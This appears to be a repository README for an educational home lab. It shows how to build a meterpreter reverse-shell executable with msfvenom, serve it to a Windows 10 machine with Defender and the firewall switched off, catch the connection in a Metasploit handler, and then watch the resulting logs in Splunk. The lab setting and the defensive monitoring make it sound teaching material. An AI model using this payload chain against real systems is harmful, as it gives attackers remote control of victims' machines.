# HomeLab Setup for Kali Linux and Windows 10

This repository provides a step-by-step guide on how to set up a HomeLab environment for Kali Linux and Windows 10 for educational and research purposes. In this setup, we will configure both machines to be in the same network, and we'll turn off Windows Firewall and Windows Defender to facilitate penetration testing and ethical hacking activities.

## Prerequisites

Before proceeding with the setup, ensure the following prerequisites are met:

1. Both the Kali Linux and Windows 10 machines are connected to the same network.
2. Windows Firewall and Windows Defender are turned off on the Windows 10 machine.

## HomeLab Setup Steps

Follow these steps to create your HomeLab environment:

### 1. Network Scanning

Scan the network of the Windows 10 machine using the `nmap` tool to identify open ports. Use the following command, replacing `(ip address of Windows machine)` with the actual IP address of the Windows 10 machine:

```bash
nmap -A (ip address of Windows machine) -Pn
```

### 2. Payload Selection

List the available payloads using the `msfvenom` tool to create a malware payload. Use the following command:

```bash
msfvenom -l payloads
```

Choose a suitable payload; for example, select `windows/x64/meterpreter_reverse_tcp`.

### 3. Malware Creation

Create the malware payload using the selected payload type. Replace `(ip address of attacking machine)` with the IP address of your Kali Linux machine and `(filename.exe)` with your desired filename:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=(ip address of attacking machine) LPORT=4444 -f exe -o (filename.exe)
```

### 4. Set Up the Handler

Open the Metasploit framework handler to listen on the specified port for the configured malware. Follow these steps:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST (ip address of Kali Linux)
exploit
```

The handler is now listening to accept connections from the victim machine.

### 5. Host the Malware

To make the Windows 10 machine the victim, set up an HTTP server using Python. Run the following command to host the malware on a local web server:

```bash
python3 -m http.server 9999
```

### 6. Victim Machine Execution

On the Windows 10 machine, download the malicious exploit by visiting the website created by the Python HTTP server.

### 7. Monitor and Control

After executing the malware, you can monitor the compromised Windows machine's status. In Kali Linux, you will see all the commands to be executed on the targeted Windows machine, as it is now under Kali's control.

### Second Part

Splunk Enterprise Setup and Log Monitoring Guide

Prerequisites
Splunk Enterprise: Ensure Splunk Enterprise is downloaded and installed on your system.
Meterpreter: Access to Meterpreter on Kali Linux.

Steps to Follow:
Install Splunk Enterprise:

Follow Splunk's official installation guide for your operating system.

Access Splunk via Local Host:

Open your web browser and access Splunk at localhost:8000.
Log in using the credentials created during installation.
Generate Logs with Meterpreter:

In Kali Linux, use Meterpreter to execute specific commands.
Monitor the generated logs in Splunk.
Execute Malware on Windows:

Run malware on the Windows machine to create logs.
Review detailed process logs in Splunk, showcasing the affected activities and processes.
Video Reference:
For a visual guide and demonstration, refer to this Video Link - Log Monitoring with Splunk.


Additional Notes:
Configure Splunk to collect and index logs from both Kali Linux and the Windows machine.
For detailed configuration, troubleshooting, and specific log types, consult Splunk's official documentation and community forums.
The video serves as a visual guide for the steps mentioned in this README file.
